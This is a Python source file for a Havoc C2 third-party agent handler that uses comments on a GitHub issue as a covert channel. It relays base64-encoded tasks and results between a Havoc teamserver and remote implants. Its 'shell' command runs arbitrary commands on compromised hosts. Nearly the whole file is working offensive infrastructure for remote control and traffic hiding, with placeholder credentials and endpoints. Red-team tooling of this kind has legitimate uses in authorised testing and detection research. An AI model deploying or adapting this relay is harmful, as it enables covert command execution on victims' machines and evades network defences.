from base64 import b64decode
import requests
import time
import os
import sys
import base64
import json
from havoc.service import HavocService
from havoc.externalc2 import ExternalC2
from havoc.agent import *
import os 

# --- CONFIG ---
GITHUB_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXX" 
REPO_OWNER = "YOUR_USERNAME"
REPO_NAME = "your_repository"
ISSUE_LABEL = "HAVOCHUB"

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

HAVOC_SERVICE_ENDPOINT = "wss://127.0.0.1:443/YOUR_SERVICE_ENDPOINT"
HAVOC_SERVICE_PASSWORD = "YOUR_SERVICE_PASSWORD"
EXTERNAL_C2_ENDPOINT = "http://127.0.0.1/your_external_c2_endpoint"

sleeptime = 1
issue_number = 0
seen_comment_ids = set()

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_SHELL            = 0x152
COMMAND_EXIT             = 0x155
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data(arguments[ 'commands' ])
        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the python agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data("goodbye")
        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class python(AgentType):
    Name = "Havoc-Hub"
    Author = "@ProcessusT"
    Version = "0.1"
    Description = f"""python 3rd party agent for Havoc"""
    MagicValue = 0x41414141
    Arch = [
        "x64",
        "x86",
    ]
    Formats = [
        {
            "Name": "GitHub comments",
            "Extension": "unknown",
        },
    ]
    BuildingConfig = {
        "Sleep": "10"
    }
    Commands = [
        CommandShell(),
        CommandExit(),
    ]

    def response( self, response: dict ) -> bytes:
        try:
            agent_header    = response[ "AgentHeader" ]
            print("[+] Receieved request from agent")
            agent_header    = response[ "AgentHeader" ]
            agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
            json_data = b64decode( agent_response.decode("latin-1", errors="replace"))
            agentjson = json.loads(json_data)
            print(f"[+] Received request : {agentjson}")        
            print(f"[+] Agent headers : {agent_header}")
            if agentjson["task"] == "register":
                #print(json.dumps(agentjson,indent=4))
                print("[+] Registered agent")
                self.register( agent_header, json.loads(agentjson["data"]) )
                AgentID = response[ "AgentHeader" ]["AgentID"]
                self.console_message( AgentID, "Good", f"Python agent {AgentID} registered", "" )
                return b'registered'
            elif agentjson["task"] == "gettask":
                AgentID = response[ "Agent" ][ "NameID" ]
                self.console_message( AgentID, "Good", "Host checkin", "" )
                print("[+] Agent requested taskings")
                Tasks = self.get_task_queue( response[ "Agent" ] )
                if len(str(Tasks)) > 1 :
                    task = Tasks[4:].decode('latin-1').strip('\x00').strip()
                    print(f"[+] Task retrieved : {task}")
                    global issue_number
                    payload_b64 = base64.b64encode(task.encode("latin-1", errors="replace")).decode("latin-1", errors="replace")
                    print("[+] Sending task to agent")
                    comment_id = post_comment(issue_number, payload_b64)
                    global seen_comment_ids
                    seen_comment_ids.add(comment_id)
                    print("[+] Task sent !")
                else:
                    print("[+] No tasks for the moment.")
                Tasks = b''
            elif agentjson["task"] == "result":
                print("[+] Command result received !")
                print(agentjson)
                AgentID = response[ "Agent" ][ "NameID" ]
                self.console_message( AgentID, "Good", "Command result received :", str(agentjson["data"]) )
                Tasks = b''
            return Tasks
        except:
            pass




# ===============================
# ====== GitHub functions =======
# ===============================

def get_last_issue_number():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues"
    params = {
        "state": "open",
        "sort": "created",
        "direction": "desc",
        "per_page": 1
    }
    r = requests.get(url, headers=HEADERS, params=params)
    if r.status_code == 200 and len(r.json()) > 0:
        latest_issue = r.json()[0]
        return latest_issue["number"], latest_issue["title"]
    else:
        raise Exception("Impossible de récupérer la dernière issue Github.")

def post_comment(issue_number, payload_b64):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{issue_number}/comments"
    data = {'body': payload_b64}
    r = requests.post(url, headers=HEADERS, json=data)
    if r.status_code == 201:
        comment = r.json()
        comment_id = comment.get('id')
        return comment_id
    else:
        return False

def get_last_command(issue_number, seen_comment_ids):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{issue_number}/comments"
    r = requests.get(url, headers=HEADERS)
    comments = r.json()
    for comment in comments:
        comment_id = comment['id']
        if comment_id not in seen_comment_ids:
            text_b64 = comment.get('body','').strip()
            if text_b64 and len(text_b64)>20:
                return comment_id, text_b64
    return None, None





def main():
    # Handling service API
    Havoc_python = python()
    print( "[+] Connect to Havoc service api..." )
    havoc_service = HavocService(
        endpoint=HAVOC_SERVICE_ENDPOINT,
        password=HAVOC_SERVICE_PASSWORD
    )
    print( "[+] Register python to Havoc..." )
    havoc_service.register_agent(Havoc_python)


    # Connecting to external C2 endpoint
    print( "[+] Connect to Havoc endpoint..." )
    externalc2 = ExternalC2( EXTERNAL_C2_ENDPOINT )
    print( f"[+] ExternalC2 = {externalc2}")

    # Retrieving last issue
    global issue_number
    issue_number, issue_title = get_last_issue_number()
    print( f"[+] Last issue number is {issue_number}" )

    # Retrieving checkin and command results
    global seen_comment_ids
    while True:
        try:
            comment_id, comment_b64 = get_last_command(issue_number, seen_comment_ids)
            seen_comment_ids.add(comment_id)

            comment_decoded = base64.b64decode(comment_b64)
            print( f"[+] Last command is {str(comment_decoded)}")
            
            size = len(str(comment_decoded[12:])) + 12   # le JSON + 4 (magic) + 4 (agentid) + 4 (size)
            size_bytes = size.to_bytes(4, 'big')
            magic = comment_decoded[4:8]
            agentid = comment_decoded[8:12]
            agentheader = size_bytes + magic + agentid
            data_b64 = base64.b64encode(comment_decoded[12:])
            transmission = agentheader + data_b64
            print( f"[+] Transmission to C2 : {str(transmission)}")
            response = externalc2.transmit( transmission )

            time.sleep(sleeptime)
        except Exception as e:
            print(f"[!] Error : {e}")
            time.sleep(sleeptime)
            pass

    return


if __name__ == '__main__':
    try:
        main()
    except:
        pass